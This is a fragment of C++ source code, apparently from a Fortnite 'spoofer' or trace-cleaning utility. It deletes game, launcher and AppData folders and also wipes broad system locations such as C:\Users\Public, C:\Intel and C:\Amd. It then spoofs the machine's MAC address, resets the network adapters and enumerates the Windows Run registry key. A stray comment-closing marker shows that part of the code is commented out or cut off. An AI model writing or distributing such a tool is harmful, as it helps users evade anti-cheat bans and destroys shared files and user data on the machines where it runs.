	if (RemoveDirectory(dir_path.c_str()) != 0) {
		cout << "Successfully removed Fortnite directory" << endl;
	}
	else {
		cout << "Failed to remove Fortnite directory" << endl;
	}

	file_path = "C:\\Users\\Public\\Libraries\\*.*";
	if (DeleteFile(file_path.c_str()) != 0) {
		cout << "Successfully deleted Libraries files" << endl;
	}
	else {
		cout << "Failed to delete Libraries files" << endl;
	}
	dir_path = "C:\\Users\\Public\\Libraries";
	if (RemoveDirectory(dir_path.c_str()) != 0) {
		cout << "Successfully removed Libraries directory" << endl;
	}
	else {
		cout << "Failed to remove Libraries directory" << endl;
	}

	file_path = "C:\\Users\\" + usernamee + "\\AppData\\Local\\Microsoft\\Feeds\\*.*";
	if (DeleteFile(file_path.c_str()) != 0) {
		cout << "Successfully deleted Microsoft Feeds files" << endl;
	}
	else {
		cout << "Failed to delete Microsoft Feeds files" << endl;
	}
	dir_path = "C:\\Users\\" + usernamee + "\\AppData\\Local\\Microsoft\\Feeds";
	if (RemoveDirectory(dir_path.c_str()) != 0) {
		cout << "Successfully removed Microsoft Feeds directory" << endl;
	}
	else {
		cout << "Failed to remove Microsoft Feeds directory" << endl;
	}

	file_path = "C:\\Users\\" + usernamee + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav\\*.*";
	if (DeleteFile(file_path.c_str()) != 0) {
		cout << "Successfully deleted Manifest.sav files" << endl;
	}
	else {
		cout << "Failed to delete Manifest.sav files" << endl;
	}
	dir_path = "C:\\Users\\" + usernamee + "\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav";
	if (RemoveDirectory(dir_path.c_str()) != 0) {
		cout << "Successfully removed Manifest.sav directory" << endl;
	}
	else {
		cout << "Failed to remove Manifest.sav directory" << endl;
	}

	file_path = "C:\\Users\\Public\\*.*";
	if (DeleteFile(file_path.c_str()) != 0) {
		cout << "Successfully deleted Public files" << endl;
	}
	else {
		cout << "Failed to delete Public files" << endl;
	}
	dir_path = "C:\\Users\\Public";
	if (RemoveDirectory(dir_path.c_str()) != 0) {
		cout << "Successfully removed Public directory" << endl;
	}
	else {
		cout << "Failed to remove Public directory" << endl;
	}

	file_path = "C:\\Intel\\*.*";
	if (DeleteFile(file_path.c_str()) != 0) {
		cout << "Successfully deleted Intel files" << endl;
	}
	else {
		cout << "Failed to delete Intel files" << endl;
	}
	dir_path = "C:\\Intel";
	if (RemoveDirectory(dir_path.c_str()) != 0) {
		cout << "Successfully removed Intel directory" << endl;
	}
	else {
		cout << "Failed to remove Intel directory" << endl;
	}

	file_path = "C:\\Amd\\*.*";
	if (DeleteFile(file_path.c_str()) != 0) {
		cout << "Successfully deleted AMD files" << endl;
	}
	else {
		cout << "Failed to delete AMD files" << endl;
	}
	dir_path = "C:\\Amd";
	if (RemoveDirectory(dir_path.c_str()) != 0) {
		cout << "Successfully removed AMD directory" << endl;
	}
	else {
		cout << "Failed to remove AMD directory" << endl;
	}

	file_path = "C:\\Users\\Public\\SharedFiles";
	if (DeleteFile(file_path.c_str()) != 0) {
		cout << "Successfully deleted SharedFiles" << endl;
	}
	else {
		cout << "Failed to delete SharedFiles" << endl;
	}

	string dir_paths[] = {
		"C:\\Users\\" + usernamee + "\\AppData\\Local\\CEF",
		"C:\\Users\\" + usernamee + "\\AppData\\Local\\Comms",
		"C:\\Users\\" + usernamee + "\\AppData\\Local\\ConnectedDevicesPlatform",
		"C:\\Users\\" + usernamee + "\\AppData\\Local\\CrashDumps",
		"C:\\Users\\" + usernamee + "\\AppData\\Local\\CrashReportClient",
		"C:\\Users\\" + usernamee + "\\AppData\\Local\\D3DSCache",
		"C:\\Users\\" + usernamee + "\\AppData\\Local\\DBG",
		"C:\\Users\\" + usernamee + "\\AppData\\Local\\EpicGamesLauncher"
	};
	for (string dir_path : dir_paths) {
		if (RemoveDirectory(dir_path.c_str()) != 0) {
			cout << "Successfully removed " << dir_path << " directory" << endl;
		}
		else {
			cout << "Failed to remove " << dir_path << " directory" << endl;
		}
	}
	std::string macAddress = GenerateMACAddress();
	SetMACAddress(macAddress);
	ResetNetworkAdapters();
	system("cls");
	std::cout << "Choose TheBigBoy if u don't want it to Auto Start when you restart your PC (recommanded to don't)";

	HANDLE caca = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (caca == INVALID_HANDLE_VALUE)
	{
		cerr << "Failed to get the process snapshot!" << endl;
		return 1;
	}


	HKEY hKeya;
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKeya) == ERROR_SUCCESS)
	{

		char name[256];
		DWORD nameSize = sizeof(name);
		for (int i = 0; RegEnumValue(hKeya, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; i++)
		{
			// Check if the process is running
			PROCESSENTRY32 pe32;
			pe32.dwSize = sizeof(pe32);
			if (Process32First(caca, &pe32))
			{
				bool running = false;
				do
				{
					if (_tcscmp(pe32.szExeFile, name) == 0)
					{
						running = true;
						break;
					}
				} while (Process32Next(caca, &pe32));


				cout << "[" << (char)('A' + i) << "] " << name << (running ? " (running)" : "") << endl;
			}


			nameSize = sizeof(name);
		}


		RegCloseKey(hKeya);*/


	
	cout << "Done, you may now close the application.";
	std::cin.ignore();
}
